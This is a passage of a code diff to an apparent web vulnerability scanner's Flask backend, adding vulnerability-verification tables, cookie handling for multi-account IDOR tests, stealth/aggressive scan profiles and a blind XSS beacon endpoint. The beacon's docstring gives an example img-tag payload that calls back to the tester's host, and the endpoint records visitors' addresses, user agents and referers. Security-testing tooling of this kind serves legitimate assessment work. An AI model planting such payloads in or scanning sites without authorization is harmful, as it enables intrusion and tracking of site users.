+                    app.logger.debug(f"Import skip for {raw}: {_e}")
+                except Exception:
+                    pass
+        try:
+            am.notify_change(
+                message="Assets imported",
+                payload={"count": added, "method": method},
+                ntype="change"
+            )
+        except Exception:
+            pass
+        return jsonify({"success": True, "added": added, "discovery_method": method})
+    except Exception as e:
+        app.logger.error(f"Import assets error: {e}")
         return jsonify({"success": False, "error": str(e)}), 500
 
 def init_db_and_scope():
@@ -2296,10 +3182,45 @@ def init_db_and_scope():
                     severity TEXT, evidence TEXT, payload TEXT, detected_at TEXT, confidence REAL
                 )
             """)
+            # Ensure verification table exists for UI joins/badges
+            db.execute("""
+                CREATE TABLE IF NOT EXISTS vulnerability_verifications (
+                    id INTEGER PRIMARY KEY,
+                    vulnerability_id INTEGER,
+                    method TEXT,
+                    marker TEXT,
+                    details TEXT,
+                    screenshot_path TEXT,
+                    created_at TEXT DEFAULT CURRENT_TIMESTAMP,
+                    oob_event_id TEXT
+                )
+            """)
             # Ensure confidence column exists
             vcols = {row[1] for row in db.execute('PRAGMA table_info(vulnerabilities)').fetchall()}
+            # Universal column guardrails for vulnerabilities schema
+            if 'asset_url' not in vcols:
+                db.execute("ALTER TABLE vulnerabilities ADD COLUMN asset_url TEXT")
             if 'confidence' not in vcols:
                 db.execute("ALTER TABLE vulnerabilities ADD COLUMN confidence REAL")
+            # Enforce de-duplication at DB level: unique by (asset_id, type, payload)
+            try:
+                db.execute("CREATE UNIQUE INDEX IF NOT EXISTS idx_vuln_unique ON vulnerabilities(asset_id, type, payload)")
+            except Exception:
+                pass
+
+            # OOB Events table for blind verification beacons (universal, simple)
+            db.execute("""
+                CREATE TABLE IF NOT EXISTS oob_events (
+                    id INTEGER PRIMARY KEY,
+                    marker TEXT,
+                    event_type TEXT,
+                    url TEXT,
+                    remote_addr TEXT,
+                    user_agent TEXT,
+                    referer TEXT,
+                    created_at TEXT DEFAULT CURRENT_TIMESTAMP
+                )
+            """)
 
             # Ensure activities table exists
             db.execute("""
@@ -2688,11 +3609,15 @@ def clear_logs():
 
 @app.route('/api/cookies/persist', methods=['POST'])
 def persist_cookie_keys():
-    """Set or update persistent cookie key=val pairs for a domain."""
+    """Set or update persistent cookie key=val pairs for a domain.
+
+    Accepts optional 'replace': true to overwrite existing persistent keys instead of merging.
+    """
     try:
         data = request.get_json() or {}
         domain = (data.get('domain') or '').strip()
         pairs = data.get('pairs') or []  # list of 'key=value'
+        replace = bool(data.get('replace'))
         if not domain:
             return jsonify({"success": False, "error": "Domain is required"}), 400
         # Normalize pairs
@@ -2705,10 +3630,10 @@ def persist_cookie_keys():
                     cleaned.append(f"{k}={v}")
         import json
         with sqlite3.connect(app.config['database_path']) as db:
-            # Merge with existing persistent
+            # Merge with existing persistent unless replace=True
             row = db.execute("SELECT persistent FROM cookies WHERE domain=?", (domain,)).fetchone()
             existing = []
-            if row and row[0]:
+            if not replace and row and row[0]:
                 try:
                     existing = json.loads(row[0])
                 except Exception:
@@ -2726,7 +3651,7 @@ def persist_cookie_keys():
             db.execute("INSERT INTO cookies(domain, persistent, last_updated) VALUES(?, ?, datetime('now'))\n                       ON CONFLICT(domain) DO UPDATE SET persistent=excluded.persistent, last_updated=excluded.last_updated",
                        (domain, json.dumps(merged)))
             db.commit()
-        return jsonify({"success": True, "domain": domain, "persistent": merged})
+        return jsonify({"success": True, "domain": domain, "persistent": merged, "replace": replace})
     except Exception as e:
         app.logger.error(f"Persist cookie error: {e}")
         return jsonify({"success": False, "error": str(e)}), 500
@@ -3088,6 +4013,8 @@ def run_idor_test():
         data = request.get_json()
         target_url = data.get('target_url', '')
         credentials = data.get('credentials', [])
+        use_minimized = bool(data.get('use_minimized_cookie'))
+        respect_locked = bool(data.get('respect_locked_values'))
         
         if not credentials:
             return jsonify({"success": False, "error": "At least one credential set is required"}), 400
@@ -3101,6 +4028,47 @@ def run_idor_test():
         # Initialize components
         asset_manager = AssetManager()
         config = {"test_credentials": credentials}
+        
+        # Optionally minimize session cookies per credential using stored policy hints
+        if use_minimized and isinstance(credentials, list):
+            try:
+                from urllib.parse import urlparse as _urlparse
+                host = _urlparse(target_url).netloc.lower() if target_url else ''
+                import json as _json
+                with sqlite3.connect(app.config['database_path']) as _db:
+                    p_row = _db.execute("SELECT persistent, auth_keys, policy FROM cookies WHERE domain LIKE ? OR domain=? ORDER BY last_updated DESC LIMIT 1", (f"%{host}%", host)).fetchone() if host else None
+                    keep = []
+                    locked_extra = ''
+                    if p_row:
+                        try:
+                            kp = p_row[0]
+                            ak = p_row[1]
+                            pol = p_row[2]
+                            if isinstance(kp, str): kp = _json.loads(kp)
+                            if isinstance(ak, str): ak = _json.loads(ak)
+                            keep = [*(kp or []), *(ak or [])]
+                            if respect_locked and pol:
+                                pj = _json.loads(pol)
+                                if isinstance(pj, dict) and pj.get('locked_cookies'):
+                                    locked_extra = str(pj.get('locked_cookies'))
+                        except Exception:
+                            keep = []
+                    if not keep:
+                        keep = ['phpsessid','session','sess','auth','token','csrftoken','xsrf','jwt','remember']
+                    from modules.auth_manager import AuthManager
+                    for cred in credentials:
+                        ck = (cred or {}).get('session_cookie') or ''
+                        if not ck:
+                            continue
+                        try:
+                            minimized = AuthManager.minimize_cookie(ck, keep)
+                            if locked_extra:
+                                minimized = (minimized + '; ' + locked_extra).strip('; ')
+                            cred['session_cookie'] = minimized
+                        except Exception:
+                            continue
+            except Exception as _e:
+                app.logger.debug(f"IDOR minimize error: {_e}")
         idor_tester = MultiCredentialIDORTester(asset_manager, config)
         
         # Run IDOR testing
@@ -3222,6 +4190,151 @@ def compare_responses():
     except Exception as e:
         app.logger.error(f"Response comparison error: {e}")
         return jsonify({"success": False, "error": str(e)}), 500
+
+# ===== Scanner Profile API =====
+
+@app.route('/api/scanner/profile', methods=['GET', 'POST'])
+def scanner_profile():
+    """Get or set the global scanner profile (stealth|normal|aggressive)."""
+    from pathlib import Path as _Path
+    import json as _json
+    prof_path = _Path(__file__).resolve().parent / 'scan_profile.json'
+    prof_map = {"stealth": {"inline": 1, "tier3": 100}, "normal": {"inline": 5, "tier3": 500}, "aggressive": {"inline": 20, "tier3": 1500}}
+    if request.method == 'GET':
+        try:
+            if prof_path.exists():
+                data = _json.loads(prof_path.read_text(encoding='utf-8') or '{}')
+                prof = (data.get('profile') or 'normal').lower()
+            else:
+                prof = 'normal'
+            return jsonify({"profile": prof, "limits": prof_map.get(prof, prof_map['normal'])})
+        except Exception as e:
+            app.logger.error(f"Profile GET error: {e}")
+            return jsonify({"profile": 'normal', "limits": prof_map['normal']}), 200
+    else:
+        try:
+            data = request.get_json() or {}
+            prof = (data.get('profile') or 'normal').lower()
+            if prof not in prof_map:
+                return jsonify({"error": "Invalid profile"}), 400
+            prof_path.write_text(_json.dumps({"profile": prof}), encoding='utf-8')
+            return jsonify({"profile": prof, "limits": prof_map[prof]})
+        except Exception as e:
+            app.logger.error(f"Profile SET error: {e}")
+            return jsonify({"error": str(e)}), 500
+
+@app.route('/api/scanner/policy', methods=['GET', 'POST'])
+def scanner_policy():
+    """Get or set engine runtime policy (e.g., pause_discovery)."""
+    from pathlib import Path as _Path
+    import json as _json
+    pol_path = _Path(__file__).resolve().parent / 'engine_policy.json'
+    if request.method == 'GET':
+        try:
+            pol = _json.loads(pol_path.read_text(encoding='utf-8') or '{}') if pol_path.exists() else {}
+            return jsonify(pol)
+        except Exception as e:
+            app.logger.error(f"Policy GET error: {e}")
+            return jsonify({}), 200
+    else:
+        try:
+            data = request.get_json() or {}
+            pol_path.write_text(_json.dumps({
+                'pause_discovery': bool(data.get('pause_discovery', False))
+            }), encoding='utf-8')
+            return jsonify({'pause_discovery': bool(data.get('pause_discovery', False))})
+        except Exception as e:
+            app.logger.error(f"Policy SET error: {e}")
+            return jsonify({"error": str(e)}), 500
+
+@app.route('/oob/xss/<marker>', methods=['GET'])
+def oob_xss_beacon(marker: str):
+    """Blind XSS beacon endpoint. Records hits and returns a 1x1 pixel.
+
+    Usage in payloads: <img src="http://<our_host>/oob/xss/<MARKER>?u=<encoded target url>">
+    """
+    try:
+        import base64
+        from urllib.parse import unquote
+        url = request.args.get('u', '')
+        try:
+            url = unquote(url)
+        except Exception:
+            pass
+        with sqlite3.connect(app.config['database_path']) as db:
+            db.execute(
+                "INSERT INTO oob_events (marker, event_type, url, remote_addr, user_agent, referer) VALUES (?,?,?,?,?,?)",
+                (
+                    marker[:128],
+                    'xss',
+                    url[:2048] if url else '',
+                    request.remote_addr or '',
+                    (request.headers.get('User-Agent') or '')[:512],
+                    (request.headers.get('Referer') or '')[:1024]
+                )
+            )
+        try:
+            from asset_manager import AssetManager
+            AssetManager().notify_change(
+                message="Blind XSS beacon received",
+                payload={"marker": marker, "url": url, "remote": request.remote_addr},
+                ntype="vulnerability"
+            )
+        except Exception:
+            pass
+        # Return a 1x1 transparent GIF
+        pixel_gif = base64.b64decode(
+            b'R0lGODlhAQABAIABAP///wAAACwAAAAAAQABAAACAkQBADs='
+        )
+        return app.response_class(pixel_gif, mimetype='image/gif')
+    except Exception as e:
+        app.logger.error(f"OOB beacon error: {e}")
+        return ('', 204)
+
+@app.route('/api/oob/events', methods=['GET'])
+def list_oob_events():
+    """List recent OOB events (blind XSS beacons)."""
+    try:
+        limit = 50
+        try:
+            l = int(request.args.get('limit', '50'))
+            limit = max(1, min(500, l))
+        except Exception:
+            pass
+        with sqlite3.connect(app.config['database_path']) as db:
+            db.row_factory = sqlite3.Row
+            rows = db.execute(
+                "SELECT id, marker, event_type, url, remote_addr, user_agent, referer, created_at FROM oob_events ORDER BY id DESC LIMIT ?",
+                (limit,)
+            ).fetchall()
+            return jsonify({"events": [dict(r) for r in rows]})
+    except Exception as e:
+        app.logger.error(f"OOB list error: {e}")
+        return jsonify({"events": []})
+
+@app.route('/api/scan/direct/recent', methods=['GET'])
+def direct_scan_recent():
+    """Return recent direct-scan status events from notifications.jsonl"""
+    try:
+        from pathlib import Path
+        import json
+        path = Path(__file__).resolve().parent / 'notifications.jsonl'
+        items = []
+        if path.exists():
+            with open(path, 'r', encoding='utf-8') as fp:
+                for line in fp.readlines()[-300:]:
+                    try:
+                        obj = json.loads(line.strip())
+                    except Exception:
+                        continue
+                    if (obj.get('type') == 'direct_scan'):
+                        items.append(obj)
+        # Sort by ts, newest first
+        items.sort(key=lambda x: x.get('ts', 0), reverse=True)
+        return jsonify({"events": items[:20]})
+    except Exception as e:
+        app.logger.error(f"Direct recent error: {e}")
+        return jsonify({"events": []})
 
 if __name__ == '__main__':
     with app.app_context():
